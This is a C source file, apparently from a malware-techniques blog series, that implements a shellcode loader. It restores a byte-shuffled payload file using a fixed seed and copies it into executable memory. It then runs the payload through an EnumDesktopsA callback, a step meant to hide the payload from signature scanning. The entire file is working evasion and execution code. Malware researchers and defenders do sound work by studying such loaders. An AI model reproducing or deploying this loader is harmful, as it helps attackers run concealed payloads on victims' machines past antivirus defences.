/*
 * hack3.c
 * deshuffle bytes in payload and run
 * author: @cocomelonc
 * https://cocomelonc.github.io/malware/2024/09/30/malware-trick-43.html
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <windows.h>

// function to shuffle the bytes of a file
void shuffle_bytes(const char *input_file, const char *output_file, unsigned int seed) {
  // read the input file as bytes
  FILE *in = fopen(input_file, "rb");
  if (in == NULL) {
    perror("fopen input file failed");
    return;
  }

  // get the size of the file
  fseek(in, 0, SEEK_END);
  size_t size = ftell(in);
  fseek(in, 0, SEEK_SET);

  // allocate memory for the file data
  char *data = (char *)malloc(size);
  if (data == NULL) {
    perror("malloc failed");
    fclose(in);
    return;
  }

  // read the file data into the buffer
  if (fread(data, 1, size, in) != size) {
    perror("fread failed");
    fclose(in);
    free(data);
    return;
  }
  fclose(in);

  // create a list of indices
  int *indices = (int *)malloc(size * sizeof(int));
  if (indices == NULL) {
    perror("malloc failed");
    free(data);
    return;
  }
  for (size_t i = 0; i < size; ++i) {
    indices[i] = i;
  }

  // shuffle the indices
  srand(seed);
  for (size_t i = size - 1; i > 0; --i) {
    size_t j = rand() % (i + 1);
    int temp = indices[i];
    indices[i] = indices[j];
    indices[j] = temp;
  }

  // create a new buffer for shuffled data
  char *shuffled_data = (char *)malloc(size);
  if (shuffled_data == NULL) {
    perror("malloc failed");
    free(data);
    free(indices);
    return;
  }

  // rearrange the data according to shuffled indices
  for (size_t i = 0; i < size; ++i) {
    shuffled_data[i] = data[indices[i]];
  }

  // write the shuffled data to the output file
  FILE *out = fopen(output_file, "wb");
  if (out == NULL) {
    perror("fopen output file failed");
    free(data);
    free(indices);
    free(shuffled_data);
    return;
  }
  if (fwrite(shuffled_data, 1, size, out) != size) {
    perror("fwrite failed");
    fclose(out);
    free(data);
    free(indices);
    free(shuffled_data);
    return;
  }
  fclose(out);

  // free allocated memory
  free(data);
  free(indices);
  free(shuffled_data);
}

// deshuffle bytes function
char* deshuffle_bytes(char* data, size_t size, unsigned int seed) {
  // Create a list of indices
  int *indices = (int *)malloc(size * sizeof(int));
  if (indices == NULL) {
    perror("malloc failed");
    return NULL; // Return NULL on error
  }
  for (size_t i = 0; i < size; ++i) {
    indices[i] = i;
  }

  // shuffle the indices
  srand(seed);
  for (size_t i = size - 1; i > 0; --i) {
    size_t j = rand() % (i + 1);
    int temp = indices[i];
    indices[i] = indices[j];
    indices[j] = temp;
  }

  // create a new buffer for deshuffled data
  char *deshuffled_data = (char *)malloc(size);
  if (deshuffled_data == NULL) {
    perror("malloc failed");
    free(indices);
    return NULL; // Return NULL on error
  }

  // rearrange the data according to shuffled indices
  for (size_t i = 0; i < size; ++i) {
    deshuffled_data[indices[i]] = data[i];
  }

  // free the original data buffer (we don't need it anymore)
  free(data);

  // return the deshuffled data
  return deshuffled_data;
}

int main() {
  const char *input_file = "shuffled.bin";
  unsigned int seed = 12345;

  // read the shuffled file
  FILE *shuffled_fp = fopen(input_file, "rb");
  if (shuffled_fp == NULL) {
    perror("fopen shuffled file failed");
    return 1;
  }
  fseek(shuffled_fp, 0, SEEK_END);
  size_t shuffled_size = ftell(shuffled_fp);
  fseek(shuffled_fp, 0, SEEK_SET);
  char *shuffled_data = (char *)malloc(shuffled_size);
  if (shuffled_data == NULL) {
    perror("malloc failed");
    fclose(shuffled_fp);
    return 1;
  }
  if (fread(shuffled_data, 1, shuffled_size, shuffled_fp) != shuffled_size) {
    perror("fread failed");
    fclose(shuffled_fp);
    free(shuffled_data);
    return 1;
  }
  fclose(shuffled_fp);

  // deshuffle the data and run it directly
  char* deshuffled_data = deshuffle_bytes(shuffled_data, shuffled_size, seed);
  if (deshuffled_data == NULL) {
    return 1;
  }

  printf("deshuffled payload:\n");
  for (int i = 0; i < shuffled_size; i++) {
    printf("%02x ", deshuffled_data[i]);
  }
  printf("\n\n");

  // allocate memory and copy deshuffled data
  LPVOID mem = VirtualAlloc(NULL, shuffled_size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
  if (mem == NULL) {
    perror("VirtualAlloc failed");
    free(deshuffled_data);
    return 1;
  }
  RtlMoveMemory(mem, deshuffled_data, shuffled_size);

  // run the deshuffled payload
  EnumDesktopsA(GetProcessWindowStation(), (DESKTOPENUMPROCA)mem, NULL);

  // free allocated memory
  free(deshuffled_data);
  return 0;
}